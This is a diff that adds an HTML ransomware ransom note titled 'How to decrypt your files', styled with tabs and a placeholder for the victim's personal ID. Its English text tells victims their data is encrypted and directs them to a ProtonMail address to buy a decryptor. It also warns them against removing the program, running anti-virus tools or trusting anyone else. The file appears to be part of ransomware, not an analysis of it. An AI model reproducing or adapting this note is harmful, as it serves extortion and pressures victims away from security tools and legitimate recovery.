@@ -1,0 +1,172 @@
+<html>
+    <style type="text/css">
+
+      body {
+  background-color: #404040;
+      }
+{
+    margin: 0;
+    padding: 0;
+}
+
+h1, h3{
+  text-align:  center;
+  text-transform: uppercase;
+  font-weight: normal;
+}
+
+
+/*---*/
+.tabs1{
+    width: 800px;
+    display: block;
+    margin: auto;
+    position: relative;
+}
+.tabs1 .head{
+    text-align:  center;
+    float: top;
+    text-transform: uppercase;
+    font-weight: normal;
+    display: block;
+    padding: 15px;
+    color: #000000;
+    background: #4A83FD;
+}
+
+.tabs1 .identi {
+	margin-left: 15px;
+    line-height: 13px;
+    font-size: 13px;
+    text-align:  center;
+    float: top;
+    display: block;
+    padding: 15px;
+    background: #303030;
+    color: #DFDFDF;
+}
+
+/*---*/
+.tabs{
+    width: 800px;
+    display: block;
+    margin: auto;
+    position: relative;
+}
+
+.tabs .tab{
+    float: left;
+    display: block;
+}
+
+.tabs .tab>input[type="radio"] {
+    position: absolute;
+    top: -9999px;
+    left: -9999px;
+}
+
+.tabs .tab>label {
+    display: block;
+    padding: 6px 21px;
+    font-size: 18x;
+    text-transform: uppercase;
+    cursor: pointer;
+    position: relative;
+    color: #FFF;
+    background: #4A83FD;
+}
+
+.tabs .content {
+    z-index: 0;/* or display: none; */
+    overflow: hidden;
+    width: 800px;
+    /*padding: 25px;*/
+    position: absolute;
+    top: 32px;
+    left: 0;
+    background: #303030;
+    color: #DFDFDF;
+    
+    opacity:0;
+    transition: opacity 400ms ease-out;
+}
+
+.tabs .content .text{
+width: 700px; 
+padding: 25px;
+}
+
+.tabs>.tab>[id^="tab"]:checked + label {
+    top: 0;
+    background: #303030;
+    color: #F5F5F5;
+}
+
+.tabs>.tab>[id^="tab"]:checked ~ [id^="tab-content"] {
+    z-index: 1;/* or display: block; */
+   
+    opacity: 1;
+    transition: opacity 400ms ease-out;
+}
+
+    </style>
+  <head>
+    <meta charset="utf-8">
+    <title>HOW TO DECRYPT YOUR FILES</title>
+  </head>
+
+  <body>
+
+    <div class="tabs1">
+      <div class="head" ><h3>Your personal ID</h3></div>
+      <div class="identi">
+      <pre>
+
+</pre><!-- !!! dont changing this !!! -->
+      </div>
+    </div>
+  <!-- -->
+    <div class="tabs">
+<!--tab-->  
+    <div class="tab">
+        <input type="radio" name="tabs" checked="checked" id="tab1" />
+        <label for="tab1">English</label>
+        <div id="tab-content1" class="content">
+          <h1>&#9760; Your files are encrypted! &#9760;</h1>
+          <hr/>
+          <h3>All your important data has been encrypted.</h3>
+          <br/>          
+          <div class="text">
+          <!--text data -->
+		  To recover data you need decryptor.</br>
+           To get the decryptor you should:</br>
+            <p>Send 1 test image or text file <span> dresdent@protonmail.com</span>.</br>
+              In the letter include your personal ID (look at the beginning of this document).</p>
+			  We will give you the decrypted file and assign the price for decryption all files</p>
+              After we send you instruction how to pay for decrypt and after payment you will receive a decryptor and instructions
+              We can decrypt one file in quality the evidence that we have the decoder.</br>
+              <center>Attention!</center></br>
+            <ul>
+			  <li>Only  dresdent@protonmail.com can decrypt your files</li>
+			  <li>Do not trust anyone  dresdent@protonmail.com</li>
+              <li>Do not attempt to remove the program or run the anti-virus tools</li>
+              <li>Attempts to self-decrypting files will result in the loss of your data</li>
+              <li>Decoders other users are not compatible with your data, because each user's unique encryption key</li>
+            </ul>
+          <!--text data -->
+          </div> 
+        </div>
+    </div>
+ <!--tab-->    
+
+            </ul>
+          <!--text data -->
+          </div> 
+        </div>
+<!--tab--> 
+    </div>
+    
+  </div>
+  
+  </body>
+</html>
